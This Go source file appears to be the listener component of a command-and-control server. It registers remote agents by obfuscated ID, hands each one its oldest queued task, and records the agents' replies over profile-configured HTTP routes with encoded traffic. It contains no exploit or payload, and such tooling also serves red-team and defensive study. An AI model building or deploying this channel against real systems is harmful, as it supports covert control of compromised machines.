package listeners

import (
	"c2/models"
	"c2/repos"
	"common/profiles"
	"errors"
	"log"
	"net/http"
	"strings"

	"gorm.io/gorm"
)

type ListenerService struct {
	Server *http.Server
}

func maybeAbort(err error, r *http.Request) (abort bool) {
	if err == nil {
		return false
	}
	// TODO: Do something if needed.
	log.Println("endpoint error handler:", err)
	return true
}

func getID(req *profiles.ProfileRequest, r *http.Request) (agentID string, err error) {
	obfuscatedAgentID, err := extractPlacement(&req.ID.Placement, r)
	if err != nil {
		return "", err
	}
	return profiles.OperateDataReverseOperations(&req.ID.Operations, &obfuscatedAgentID, false)
}

func getBody(req *profiles.ProfileRequest, r *http.Request) (agentID string, err error) {
	obfuscatedData, err := extractPlacement(&req.Payload.Request.Placement, r)
	if err != nil {
		return "", err
	}
	return profiles.OperateDataReverseOperations(&req.Payload.Request.Operations, &obfuscatedData, false)
}

func getLatestMessage(req *profiles.ProfileRequest) (handler func(w http.ResponseWriter, r *http.Request)) {
	return func(w http.ResponseWriter, r *http.Request) {
		agentID, err := getID(req, r)
		if maybeAbort(err, r) {
			return
		}

		if _, err := repos.GetAgent(agentID); errors.Is(err, gorm.ErrRecordNotFound) {
			repos.InsertAgent(&models.Agent{
				ID: agentID,
				IP: r.RemoteAddr,
			})
		}

		message, err := repos.GetOldestMessageForAgent(agentID)
		if /*!errors.Is(err, gorm.ErrRecordNotFound) && */ maybeAbort(err, r) {
			return
		}

		obfuscatedResponse, err := profiles.OperateData(&req.Payload.Response.Operations, &message.Request, true)
		if maybeAbort(err, r) {
			return
		}

		if req.Payload.Response.StatusCode > 0 {
			w.WriteHeader(req.Payload.Response.StatusCode)
		}
		w.Write([]byte(obfuscatedResponse))
	}

}

func respondToMessage(req *profiles.ProfileRequest) (handler func(w http.ResponseWriter, r *http.Request)) {
	return func(w http.ResponseWriter, r *http.Request) {
		agentID, err := getID(req, r)
		if maybeAbort(err, r) {
			return
		}

		body, err := getBody(req, r)
		if maybeAbort(err, r) {
			return
		}

		if err = repos.UpdateOldestMessageResponse(agentID, body); maybeAbort(err, r) {
			return
		}

		if req.Payload.Response.StatusCode > 0 {
			w.WriteHeader(req.Payload.Response.StatusCode)
		}
		if len(req.Payload.Request.Operations) == 0 {
			return
		}

		emptyResp := ""

		obfuscatedResponse, err := profiles.OperateData(&req.Payload.Response.Operations, &emptyResp, true)
		if maybeAbort(err, r) {
			return
		}

		w.Write([]byte(obfuscatedResponse))
	}
}

func handlersFromProfile(profile *profiles.Profile) (handler *http.ServeMux, err error) {
	handler = http.NewServeMux()

	for _, method := range profile.Receive.Methods {
		for _, route := range profile.Receive.Routes {
			if !strings.HasPrefix(route, "/") {
				route = "/" + route
			}
			handler.HandleFunc(method+" "+route, getLatestMessage(&profile.Receive))
		}
	}

	for _, method := range profile.Respond.Methods {
		for _, route := range profile.Respond.Routes {
			if !strings.HasPrefix(route, "/") {
				route = "/" + route
			}
			handler.HandleFunc(method+" "+route, respondToMessage(&profile.Respond))
		}
	}

	return handler, nil
}
